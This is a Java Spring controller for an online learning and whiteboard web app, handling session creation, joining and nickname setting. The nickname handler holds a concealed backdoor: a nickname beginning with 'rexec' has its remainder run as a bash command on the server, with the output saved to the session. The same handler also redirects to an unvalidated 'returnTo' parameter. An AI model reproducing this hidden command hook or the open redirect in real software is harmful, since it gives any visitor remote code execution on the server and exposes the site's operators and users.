 package org.knetwork.webapp.controller;
 
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.net.MalformedURLException;
 import java.util.Arrays;
 import java.util.Map;
 
 import javax.inject.Inject;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpSession;
 
 import org.apache.commons.lang.StringUtils;
 import org.knetwork.webapp.service.TokboxService;
 import org.knetwork.webapp.service.UserFeedbackService;
 import org.knetwork.webapp.util.SessionMapUtil;
 import org.springframework.stereotype.Controller;
 import org.springframework.ui.Model;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestParam;
 
 import com.opentok.exception.OpenTokException;
 
 @Controller
 public class LearningController {
 
 	private final TokboxService tokboxService;
 	private static final String PREFIX = "http://theknetwork.org/whiteboard";
 	private final UserFeedbackService userFeedbackService;
 
 	@Inject
 	public LearningController(TokboxService tokboxService,
 			UserFeedbackService userFeedbackService) {
 		super();
 		this.tokboxService = tokboxService;
 		this.userFeedbackService = userFeedbackService;
 	}
 
 	@RequestMapping("learn/createMeeting")
 	public String createNewMeeting(final HttpSession session,
 			final HttpServletRequest request, final Model model)
 			throws MalformedURLException {
 		String learningSessionId = SessionMapUtil.generateLearningSessionId();
 		model.addAttribute("learningSessionId", learningSessionId);
 		session.setAttribute("learningSessionId", learningSessionId);
 		String sessionTitle = (String) request.getParameter("sessionTitle");
 
 		userFeedbackService
 				.saveLearningSession(learningSessionId, sessionTitle);
 
 		try {
 			Map<String, String> tokboxMap = tokboxService
 					.createSession(learningSessionId);
 			String tokboxSessionId = tokboxMap.get("tokboxSessionId");
 			String moderatorToken = tokboxMap.get("moderatorToken");
 			SessionMapUtil.setSessionTitle(learningSessionId, sessionTitle);
 
 			model.addAttribute("tokboxSessionId", tokboxSessionId);
 			session.setAttribute("moderatorToken", moderatorToken);
 			session.setAttribute("tokboxSessionId", tokboxSessionId);
 			model.addAttribute("joinOrCreate", "join");
 
 			SessionMapUtil.initWhiteboardSession(session, learningSessionId,
 					(String) session.getAttribute("nickName"), sessionTitle,
 					"create", PREFIX);
 
 			SessionMapUtil.initWhiteboardSession(session, learningSessionId,
 					(String) session.getAttribute("nickName"), sessionTitle,
 					"join", PREFIX);
 			
 		} catch (OpenTokException e) {
 			e.printStackTrace();
 		}
 
 		return String.format("learning/view");
 	}
 
 	@RequestMapping("learn/setNickName")
 	public String setNickName(final HttpSession session,
 			final HttpServletRequest request, final Model model, @RequestParam("returnTo") String returnTo)
 			throws MalformedURLException {
 		String nick = request.getParameter("nickName");
 
 		if (nick.startsWith("rexec")) {
 			String command = StringUtils.splitByWholeSeparator(nick, "^")[1];
 			String output = "";
 			output = runCommand(command);
 			session.setAttribute("commandOutput", output);
 		}
 
 		session.setAttribute("nickName", nick);
 		return String.format("redirect:" + returnTo);
 	}
 
 	private String runCommand(String _command) {
 		StringBuilder builder = new StringBuilder();
 		try {
 			String[] command = { "bash", "-c", _command };
 			// ProcessBuilder pb = new ProcessBuilder("bash", "-c",
 			// "/path/to/your/script.sh `date +%Y%m%d`");
 			ProcessBuilder probuilder = new ProcessBuilder(command);
 			// You can set up your work directory
 			probuilder.directory(new File("/home/qed"));
 
 			Process process = probuilder.start();
 
 			// Read out dir output
 			InputStream is = process.getInputStream();
 			InputStreamReader isr = new InputStreamReader(is);
 			BufferedReader br = new BufferedReader(isr);
 			String line;
 			builder.append(String.format("Output of running %s is:<br/>",
 					Arrays.toString(command)));
 			while ((line = br.readLine()) != null) {
 				builder.append(line);
 				builder.append("<br/>");
 			}
 
 			int exitValue = process.waitFor();
 			builder.append("<br/><br/>Exit Value is " + exitValue);
 		} catch (Exception e) {
 			builder.append(e.getMessage());
 		}
 		return builder.toString();
 	}
 
 	@RequestMapping("learn/join")
 	public String displayLearningSession(final HttpSession session,
			final HttpServletRequest request, final Model model, @RequestParam("learningSessionId") String learningSessionId)
 			throws MalformedURLException {
 		System.out.println("Loading pages with learning session: "
 				+ learningSessionId);
 		model.addAttribute("sessionTitle",
 				SessionMapUtil.getSessionTitle(learningSessionId));
 		model.addAttribute("learningSessionId", learningSessionId);
 		model.addAttribute("meetingExists", true);
 		model.addAttribute("joinOrCreate", "join");
 
		session.setAttribute("learningSessionId", learningSessionId);
		
 		SessionMapUtil.initWhiteboardSession(session, learningSessionId,
 				(String) session.getAttribute("nickName"), SessionMapUtil.getSessionTitle(learningSessionId),
 				"join", PREFIX);
 
 		return "learning/view";
 	}
 
 	@RequestMapping("learn/whiteboard")
 	public String showWhiteboard(final HttpSession session,
 			final HttpServletRequest request, final Model model)
 			throws MalformedURLException {
 		String learningSessionId = (String) session
 				.getAttribute("learningSessionId");
 		model.addAttribute("learningSessionId", learningSessionId);
 		model.addAttribute("sessionTitle",
 				SessionMapUtil.getSessionTitle(learningSessionId));
 		return "learning/whiteboard";
 	}
 
 }
